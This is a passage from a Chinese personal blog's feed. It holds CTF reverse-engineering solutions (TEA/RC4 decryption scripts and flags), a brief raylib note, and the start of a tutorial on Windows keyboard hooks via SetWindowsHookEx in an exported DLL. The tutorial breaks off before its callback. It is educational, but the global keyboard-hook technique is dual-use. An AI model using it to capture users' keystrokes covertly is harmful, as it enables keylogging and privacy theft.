class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">BYTE S[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decTEA</span><span class="params">(<span class="type">unsigned</span>* target, <span class="type">unsigned</span>* key)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">v6 = target[i];</span><br><span class="line">v5 = target[i + <span class="number">1</span>];</span><br><span class="line">sum = <span class="number">0</span> - <span class="number">0x61C88647</span> * <span class="number">0x64</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x64</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v5 -= (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v6 -= (key[sum &amp; <span class="number">3</span>] + sum) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">target[i] = v6;</span><br><span class="line">target[i + <span class="number">1</span>] = v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void __cdecl sub_A71A10(unsigned int round, DWORD* target, DWORD* key)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//unsigned int j; // [esp+4Ch] [ebp-18h]</span></span><br><span class="line"><span class="comment">//unsigned int sum; // [esp+54h] [ebp-10h]</span></span><br><span class="line"><span class="comment">//unsigned int v5; // [esp+58h] [ebp-Ch]</span></span><br><span class="line"><span class="comment">//unsigned int v6; // [esp+5Ch] [ebp-8h]</span></span><br><span class="line"><span class="comment">//int i; // [esp+60h] [ebp-4h]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 16; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = target[i];</span></span><br><span class="line"><span class="comment">//v5 = target[i + 1];</span></span><br><span class="line"><span class="comment">//sum = 0;</span></span><br><span class="line"><span class="comment">//for (j = 0; j &lt; round; ++j)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 += (key[sum &amp; 3] + sum) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5)));</span></span><br><span class="line"><span class="comment">//sum -= 0x61C88647;</span></span><br><span class="line"><span class="comment">//v5 += (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6)));</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//target[i] = v6;</span></span><br><span class="line"><span class="comment">//target[i + 1] = v5;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">swap</span><span class="params">(BYTE* a1, BYTE* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> v2; <span class="comment">// [esp+4Fh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">v2 = *a1;</span><br><span class="line">*a1 = *a2;</span><br><span class="line">*a2 = v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">Sini</span><span class="params">(BYTE* a1, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [esp+4Ch] [ebp-114h]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+50h] [ebp-110h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [esp+54h] [ebp-10Ch]</span></span><br><span class="line"><span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+58h] [ebp-108h] BYREF</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+158h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">S[i] = i;</span><br><span class="line"><span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">v5[j] = a1[j % len];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line">v3 = ((<span class="type">unsigned</span> __int8)v5[k] + v3 + (<span class="type">unsigned</span> __int8)S[k]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[k], &amp;S[v3]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">decrc4</span><span class="params">(BYTE* target, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span>* a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [esp+54h] [ebp-Ch]</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [esp+58h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">Sini</span>(a3, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v7 = (v7 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v6 = (v6 + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[v7], &amp;S[v6]);</span><br><span class="line">target[i] ^= S[((<span class="type">unsigned</span> __int8)S[v6] + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">64</span>] = &#123;</span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x1B</span>, <span class="number">0xFD</span>, <span class="number">0xB4</span>, <span class="number">0x6B</span>, <span class="number">0xB8</span>, <span class="number">0xBE</span>, <span class="number">0xD9</span>, <span class="number">0xB3</span>, <span class="number">0xD3</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0xF0</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0x3A</span>, <span class="number">0x53</span>, <span class="number">0x6D</span>, <span class="number">0x4A</span>, <span class="number">0x7B</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x3A</span>, <span class="number">0x9C</span>, <span class="number">0x4E</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x19</span>, <span class="number">0xD8</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x9C</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x56</span>, <span class="number">0xCB</span>, <span class="number">0x7A</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x9F</span>, <span class="number">0x7A</span>, <span class="number">0xBC</span>, <span class="number">0x0C</span>,</span><br><span class="line"><span class="number">0x4A</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0xCE</span>, <span class="number">0x3D</span>, <span class="number">0xB4</span>, <span class="number">0xAB</span>, <span class="number">0x29</span>, <span class="number">0x61</span>, <span class="number">0xFA</span>, <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0xB4</span>, <span class="number">0xEC</span>, <span class="number">0x4C</span>, <span class="number">0xB6</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x0CAA5BDD</span>, <span class="number">0xD6846924</span>, <span class="number">0x51041EB8</span>, <span class="number">0x8B2AAB06</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decTEA</span>((<span class="type">unsigned</span>*)last, key);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ikey[<span class="number">16</span>] = &#123;</span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0x33</span>, <span class="number">0x49</span>, <span class="number">0x19</span>, <span class="number">0x13</span>, <span class="number">0xC3</span>, <span class="number">0xC7</span>, <span class="number">0xAD</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0xBC</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decrc4</span>(last, <span class="number">64</span>, ikey);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">unsigned</span> <span class="type">char</span>)last[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C+vFCnHRGPghbmyQMXvFMRNd7fNCG8jcU+jcbnjRJTj2GTCOGUvgtOS0CTge7fNs</span></span><br></pre></td></tr></table></figure><p>对着码表直接解密</p><p>4yZRiNP8LoK&#x2F;GSA5ElWkUjXtJCz7bMYcuFfpm6+hV0rxeHIdwv32QOTnqg1BDsa9</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C0ngr<span class="meta">@tulat</span>1<span class="keyword">on</span>!Y0u_Re_suCces3fu1Ly_Signln!&#125;</span><br></pre></td></tr></table></figure><h2 id="bedTEA"><a href="#bedTEA" class="headerlink" title="bedTEA"></a>bedTEA</h2><p>观察main逻辑，先用一个奇怪算法生成了key，然后执行XTEA加密，一共三次，这里没看懂奇怪算法是什么，但是好像跟输入无关，于是尝试动调，出来后发现是斐波那契数列，用这个写tea脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">may_ini</span><span class="params">(DWORD* input, DWORD* key_array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key_index; <span class="comment">// 对应于原代码中的 v1</span></span><br><span class="line"><span class="type">int</span> key_end; <span class="comment">// 对应于原代码中的 v3</span></span><br><span class="line"><span class="type">int</span> temp_key_index; <span class="comment">// 对应于原代码中的 v4</span></span><br><span class="line"><span class="type">int</span> temp1, temp2, temp3, temp4, temp5; <span class="comment">// 对应于原代码中的 v5, v6, v7, v8, v9</span></span><br><span class="line"><span class="type">int</span> temp6; <span class="comment">// 对应于原代码中的 v10</span></span><br><span class="line"><span class="type">int</span> temp7; <span class="comment">// 对应于原代码中的 v11</span></span><br><span class="line"><span class="type">int</span> key_value; <span class="comment">// 对应于原代码中的 v12</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_second; <span class="comment">// 对应于原代码中的 v13</span></span><br><span class="line"><span class="type">int</span> delta; <span class="comment">// 对应于原代码中的 v14</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_first; <span class="comment">// 对应于原代码中的 v15</span></span><br><span class="line"><span class="type">int</span> key = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">input_second = input[<span class="number">1</span>];</span><br><span class="line">delta = <span class="number">0x987E55D0</span>;</span><br><span class="line">input_first = *input;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">input_second -= (delta + input_first) ^ (key_array[<span class="number">3</span>] + (input_first &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">2</span>] + <span class="number">32</span> * input_first);</span><br><span class="line">input_first -= (delta + input_second) ^ (key_array[<span class="number">1</span>] + (input_second &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">0</span>] + <span class="number">32</span> * input_second);</span><br><span class="line"></span><br><span class="line">delta += <span class="number">0x61CBB648</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (delta != <span class="number">0</span>);</span><br><span class="line">*input = input_first;</span><br><span class="line">input[<span class="number">1</span>] = input_second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">BYTE last[] = &#123; <span class="number">211</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">193</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">42</span>, <span class="number">137</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">245</span>, <span class="number">49</span>, <span class="number">250</span>, <span class="number">190</span>, <span class="number">194</span>, <span class="number">49</span>, <span class="number">144</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">212</span>, <span class="number">174</span>, <span class="number">66</span>, <span class="number">69</span> , <span class="number">0</span>&#125;;</span><br><span class="line">BYTE data[<span class="number">24</span>] = &#123;</span><br><span class="line"><span class="number">0xF7</span>, <span class="number">0xA1</span>, <span class="number">0x04</span>, <span class="number">0xD8</span>, <span class="number">0xD3</span>, <span class="number">0xF7</span>, <span class="number">0x2F</span>, <span class="number">0x25</span>, <span class="number">0x06</span>, <span class="number">0x91</span>, <span class="number">0xF9</span>, <span class="number">0xEC</span>, <span class="number">0xDD</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0xA9</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x84</span>, <span class="number">0xF0</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0x4E</span>, <span class="number">0xDF</span>, <span class="number">0xD1</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD rkey[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000D</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last, rkey);</span><br><span class="line">DWORD rkey2[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x00000022</span>, <span class="number">0x00000037</span>, <span class="number">0x00000059</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">2</span>, rkey2);</span><br><span class="line">DWORD rkey3[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000179</span>, <span class="number">0x00000262</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">4</span>, rkey3);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tea流程之后后面好像xor了好多东西，把每个地址都改名</p><p><img src="https://s2.loli.net/2024/07/07/ZAy7cQHEmurkDh2.png" alt="image-20240707151103500"></p><p>然后对最后检查的地址下读写断点，发现第一次写入时是倒序传入</p><p>然后异或了0x33</p><p>那么把最后的值倒序然后异或，然后解密tea即可得到flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">y0u_reallyl1ke_te@</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">好久没打CTF了</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>raylib学习</title>
    <link href="https://www.pri87.vip/posts/aa7cf3e8.html"/>
    <id>https://www.pri87.vip/posts/aa7cf3e8.html</id>
    <published>2024-06-18T14:16:08.000Z</published>
    <updated>2024-07-07T11:14:35.496Z</updated>
    
    <content type="html"><![CDATA[<p>由于C语言工程实践要用图形化界面，所以我准备开始学一下raylib<br>因为我觉得很好看</p><p>下载方式：</p><p><a href="https://www.raylib.com/">raylib | A simple and easy-to-use library to enjoy videogames programming</a></p><p>它本身不是单纯的图形库，而是集成的游戏开发工具</p><p>其中的raygui才是我这次准备学的重点</p><p>编译：</p><p><a href="https://blog.csdn.net/qq_37661242/article/details/123279843">VSCode + Mingw安装raylib_raylib安装-CSDN博客</a></p><p>要使用图形库时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RAYGUI_IMPLEMENTATION</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;raygui.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>然后尝试用内置的操作写代码，使用vscode和cmake，测试成功</p><p>至于vs，之后再试。</p>]]></content>
    
    
    <summary type="html">图形库的学习</summary>
    
    
    
    <category term="编程" scheme="https://www.pri87.vip/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="cpp" scheme="https://www.pri87.vip/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》07-键盘hook和DLL注入</title>
    <link href="https://www.pri87.vip/posts/8535f1d8.html"/>
    <id>https://www.pri87.vip/posts/8535f1d8.html</id>
    <published>2024-06-10T12:07:34.000Z</published>
    <updated>2024-06-26T14:11:07.114Z</updated>
    
    <content type="html"><![CDATA[<p>之前尝试过对函数的hook，这次参考了《逆向工程核心原理》，尝试使用windows的系统函数在系统层面对message进行hook</p><hr><h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><p>Windows是以事件驱动来工作的。每当用户执行一个操作，都会让OS把对应的消息发送给相应的应用程序。</p><p>每个消息都是一个结构，其中的message是对应的消息类别，32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       HWND    hwnd;       <span class="comment">//接受该消息的窗口句柄</span></span><br><span class="line">       UINT    message;    <span class="comment">//消息常量标识符，也就是我们通常所说的消息号</span></span><br><span class="line">       WPARAM  wParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       LPARAM  lParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       DWORD   time;       <span class="comment">//消息创建时的时间</span></span><br><span class="line">       POINT   pt;         <span class="comment">//消息创建时的鼠标/光标在屏幕坐标系中的位置</span></span><br><span class="line">&#125;MSG;</span><br></pre></td></tr></table></figure><p>标识符：</p><blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WM_NULL<span class="comment">---0x0000    空消息。</span></span><br><span class="line"><span class="number">0</span>x0001<span class="comment">----0x0087    主要是窗口消息。</span></span><br><span class="line"><span class="number">0</span>x00A0<span class="comment">----0x00A9    非客户区消息 </span></span><br><span class="line"><span class="number">0</span>x0100<span class="comment">----0x0108    键盘消息</span></span><br><span class="line"><span class="number">0</span>x0111<span class="comment">----0x0126    菜单消息</span></span><br><span class="line"><span class="number">0</span>x0132<span class="comment">----0x0138    颜色控制消息</span></span><br><span class="line"><span class="number">0</span>x0200<span class="comment">----0x020A    鼠标消息</span></span><br><span class="line"><span class="number">0</span>x0211<span class="comment">----0x0213    菜单循环消息</span></span><br><span class="line"><span class="number">0</span>x0220<span class="comment">----0x0230    多文档消息</span></span><br><span class="line"><span class="number">0</span>x03E0<span class="comment">----0x03E8    DDE消息</span></span><br><span class="line"><span class="number">0</span>x0400             WM_USER</span><br><span class="line"><span class="number">0</span>x8000             WM_APP</span><br><span class="line"><span class="number">0</span>x0400<span class="comment">----0x7FFF    应用程序自定义私有消息</span></span><br></pre></td></tr></table></figure></blockquote><p>消息分为：</p><ul><li>窗口消息：对窗口的操作触发窗口消息：创建窗口，移动窗口，单机鼠标</li><li>命令消息：属于窗口消息，处理从一个窗口发送到另一个窗口的用户请求，比如按下按钮</li><li>控件通知消息：用于子窗口通知父窗口</li></ul><p>每一个程序在执行后，都存在一个消息队列，进程通过第一次调用GDI函数创建一个队列。所有消息都存放在这个队列中，应用程序通过一个消息循环，读取其中的消息并响应。消息队列分为系统消息队列和线程消息队列，系统消息队列由Windows维护，线程消息队列由GUI线程维护。</p><p>以鼠标点击举例：</p><p>当鼠标点击时，驱动创建对应的消息传送到系统消息队列。当有应用要读取时，系统从系统队列中把对应的消息取出，传给对应的线程消息队列。线程在消息的读取循环中把消息拿出来，通过操作系统发送到对应窗口过程处理。</p><hr><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>hook，就是在它们传递过程中插入自己的代码的操作。</p><p>现在用键盘钩子举例</p><p>重要的函数有以下几个：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//创建一个钩子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);<span class="comment">//删除一个钩子</span></span><br></pre></td></tr></table></figure><p>我们要调用这个api执行钩子操作，可以直接把这个写到exe里面，但是这样就是exe监听其它的，而不是直接把dll放进去，所以把这两个函数写到dll里面并添加dllexport关键字作为导出函数，这样就可以被其它进程访问，我们可以专门写一个exe去执行它</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后再写钩子的回调函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 